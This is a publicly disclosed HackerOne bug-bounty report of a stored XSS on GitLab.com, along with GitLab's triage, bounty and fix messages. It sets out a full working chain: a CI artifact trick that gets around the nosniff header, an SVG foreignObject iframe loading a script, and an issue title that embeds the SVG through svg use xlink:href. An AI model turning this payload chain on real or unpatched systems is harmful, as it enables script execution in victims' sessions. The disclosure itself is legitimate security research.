{"id":831962,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzE5NjI=","url":"https://hackerone.com/reports/831962","title":"XSS on Issue reference numbers","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-03-26T11:32:16.498Z","submitted_at":"2020-03-26T11:32:16.498Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yvvdwf","url":"/yvvdwf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-23T16:05:04.527Z","bug_reporter_agreed_on_going_public_at":"2020-11-23T16:05:04.432Z","team_member_agreed_on_going_public_at":"2020-11-20T20:41:17.288Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Dear team,\n\nI found an XSS that occurs when users move mouse over reference numbers of issues. \nThis XSS occurs on Firefox. It does not occurs on Webkit-based ones such as Safari, Chrome. I haven't tested on Edge.\nIt can be also occured in older browsers due to [`svg4everybody()`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/commons/polyfills/svg.js#L11) and [`cachedDocument.body.innerHTML = xhr.responseText`](https://github.com/jonathantneal/svg4everybody/blob/v2.1.9/dist/svg4everybody.js#L36)\n\n### Summary\n\nXSS caused by enabling HTML of tooltip of issues' reference numbers.\nBootstrap sanitizes macilious tags/attributes of HTML tooltips.\nThe issue is that gitlab [allows](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/commons/bootstrap.js#L77) `\u003csvg\u003e`, `\u003cuse\u003e` and its `xlink:href` attribute.\nThis allows attacker to link external resource to svg images, then, to cause the XSS.\n\n\n### Steps to reproduce\n\nFour big steps to reproduce:\n\n1. create a javascript file\n2. create a file containing external svg resource\n3. create an issue's title having svg content that use the resource above\n4. create a reference to the issue, XSS occurs when users move mouse over the reference link\n\nSteps 1,2,3 are supposed to realized in a same project.\n\n#### 1. Create a javascript file\n\nThis step creates a javascript file that may contain arbitrary attack script.\nFor example, add a new file `alert.js` in a selected project with the following content:\n\n```javascript\nalert('Hello: ' + window.parent.location.href);\n```\n\nThis script will be used by an `iframe`.\n\nSince gitlab changes its mime type to ['text/plain'](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/concerns/send_file_upload.rb#L16) and set header `X-Content-Type-Options: nosniff`, browser will refuse to execute the javascript file if it will be loaded by script tag, such as `\u003cscript src=alert.js\u003e\u003c/script`.\n\nThis can be bypassed by using `job artifacts`.\n\nCreate another file `.gitlab-ci.yml` with the following content:\n\n```yml\njs:\n  script: echo \"to generate mime type application/javascript\"\n  artifacts:\n    paths:\n    - alert.js\n    expire_in: 4 week\n```\n\nAfter saving the file, gitlab CI/CD will start runing. Wait for the job finished.\nBrowse `Job artifacts`, then get the raw link of the generated `alert.js` file, for example:\n`https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js`\n\nNote that the mime type of this js file is now `application/javascript`.\n\n#### 2. Create a svg file\n\nAdd the third file in to the project with the name `xss.svg` and the following content:\n\n```xml\n\u003csvg id=\"xss\" xmlns=\"http://www.w3.org/2000/svg\"\u003e\n\t\u003cforeignObject\u003e\n\t\t\u003ciframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc='\u0026lt;script src=https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js\u0026gt; \u0026lt;/script\u0026gt;'\u003e\u003c/iframe\u003e\n\t\u003c/foreignObject\u003e\n\u003c/svg\u003e\n```\n\nPlease note that, you must replace the link to `alert.js` file with your.\n\n\n#### 3. Create an issue\n\nCreate a new issue having the following title:\n \n`\u003csvg\u003e\u003cuse xlink:href=\"https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/raw/master/xss.svg#xss\"/\u003e\u003c/svg\u003e`\n\n#### 4. Create a reference to the issue\n\nIn an issue discussion, or in a wiki page, enter the reference number of the issue, for example (suppose the issue id = 1):\n`Move mouse over #1 to see alert`\n\nWhen you move mouse over the number 1, you will see a (normal) tooltip and a popup executed by the `alert.js` file above.\n\nThis has been tested on the latest Firefox (74.0 (64-bit)) on macOS. Firefox allows `foreignObject` (but not [webkit](https://bugs.webkit.org/show_bug.cgi?id=91515))\n\n### Impact\n\nAttacker may perform arbitrary actions on behalf of users at the client side.\n\n### Examples\n\nAn example is on https://gitlab.com/yvvdwf/svg-use-xss-firefox\nThis project is private. Please let me know if you cannot access it.\n\n\n### What is the expected *correct* behavior?\n\nMalicious scripts must not be executed due to svg content.\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nAttacker may perform arbitrary actions on behalf of users at the client side.","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":46,"voters":["daviey","xploiterr","ali","0nlymohammed","aporlorxl23","joaovitormaia","idiablos","naategh","h4x0r_dz","younes___","and 36 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7447225,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yvvdwf,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 10 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2020-03-26T12:05:38.174Z","updated_at":"2020-03-26T12:05:38.174Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7453853,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @yvvdwf,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/212626.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $1000 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2020-03-26T22:08:28.672Z","updated_at":"2020-03-26T22:08:28.672Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7453860,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Initial $1000 on triage","automated_response":false,"created_at":"2020-03-26T22:08:57.665Z","updated_at":"2020-03-26T22:08:57.665Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"yvvdwf","url":"/yvvdwf"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8191300,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nI just want to notice that this attack works also by using snippets' titles.\nBest regards,","automated_response":false,"created_at":"2020-06-03T15:29:31.644Z","updated_at":"2020-06-03T15:29:31.644Z","actor":{"username":"yvvdwf","cleared":false,"url":"/yvvdwf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8191417,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @yvvdwf, \n\nThank you for the additional details, I'll let the team know.\n\nBest regards,\nDominic\nGitLab Security Team","automated_response":false,"created_at":"2020-06-03T15:42:28.528Z","updated_at":"2020-06-03T15:42:28.528Z","actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8327427,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"ETA for fix:\n\nHi @yvvdwf,\n\nThe issue you reported is currently scheduled to be fixed by 2020-07-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2020-06-18T04:21:38.095Z","updated_at":"2020-06-18T04:21:38.095Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8388593,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @yvvdwf,\n\nThank you again for the report! Your finding has been reviewed and we are awarding a bounty prior the release of a patch. Congratulations!\n\nWe will continue to keep you updated via HackerOne as a fix is scheduled.\n\nBest regards,\nDominic\nGitLab Security Team\n","automated_response":false,"created_at":"2020-06-23T19:09:11.592Z","updated_at":"2020-06-23T19:09:11.592Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"yvvdwf","url":"/yvvdwf"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8866538,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @yvvdwf ,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.2.3. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nVitor\nGitLab Security Team","automated_response":false,"created_at":"2020-08-06T15:14:54.501Z","updated_at":"2020-08-06T15:14:54.501Z","actor":{"username":"vdesousa","cleared":false,"url":"/vdesousa","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"yvvdwf","url":"/yvvdwf"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9882613,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-20T20:41:17.319Z","updated_at":"2020-11-20T20:41:17.319Z","first_to_agree":true,"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9901038,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-23T16:05:04.467Z","updated_at":"2020-11-23T16:05:04.467Z","actor":{"username":"yvvdwf","cleared":false,"url":"/yvvdwf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9901039,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-23T16:05:04.564Z","updated_at":"2020-11-23T16:05:04.564Z","actor":{"username":"yvvdwf","cleared":false,"url":"/yvvdwf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yQ79x7V8gqtK3SUH9zj881MY/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}